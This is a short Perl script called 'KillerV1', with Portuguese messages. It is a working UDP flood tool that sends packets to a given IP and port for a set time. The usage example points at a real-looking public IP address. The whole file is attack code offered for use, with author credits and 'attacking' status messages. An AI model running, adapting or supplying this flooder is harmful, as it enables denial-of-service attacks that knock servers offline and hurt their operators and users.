#!/usr/bin/perl

use Socket;
use strict;

if ($#ARGV != 3) {
  print " [+] Autor : SerrialKiller\n";
  print " [+] Script : KillerV1\n";
  print " Use: KillerV1.pl <IP> <Porta> <Pacotes> <Tempo>\n";
  print " Exemplo: KillerV1.pl 189.22.71.74 80 9999999 1000\n";
  print " Creditos: Owner - SerialKiller  Ajudante - MarcoRoot  Testador - Pain.exe\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Este IP Não Existe: $ip\n";
$endtime = time() + ($time ? $time : 1000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print "Atacando $ip Porta " . ($port ? $port : "random") . " Com " .
  ($size ? "$size-Ataques" : "random size") . " De Pacotes" .
  ($time ? " Por $time Segundos" : "") . "\n";
print "Pare O Ataque Pressionando Ctrl + C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(10024-64)+64) ;
  $pport = $port ? $port : int(rand(9999999))+1;
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}